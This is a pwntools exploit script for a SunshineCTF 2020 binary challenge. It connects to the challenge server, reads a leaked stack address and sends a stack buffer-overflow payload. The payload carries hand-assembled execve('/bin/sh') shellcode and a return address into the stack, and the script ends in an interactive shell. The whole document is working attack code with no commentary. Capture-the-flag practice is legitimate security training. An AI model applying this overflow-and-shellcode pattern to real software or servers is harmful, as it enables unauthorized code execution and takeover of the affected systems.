from pwn import *

binary = context.binary = ELF('./chall_15')
p = remote('chal.2020.sunshinectf.org',30015)
p.sendline('IxZ')
p.recvuntil("There\'s a place where nothing seems: ")
stack = int(p.recvline().strip(),16)

payload = b'A'*(0x4e-0x44)
payload += p64(0xfacade)
stack += len(payload)

#payload += asm(shellcraft.sh())
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'
#payload += b'\x90\x90\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
print(asm(shellcraft.sh()))
payload += shellcode
payload += b'A'*(0x4e-len(payload))
payload += p64(stack)

p.sendline(payload)
p.interactive()

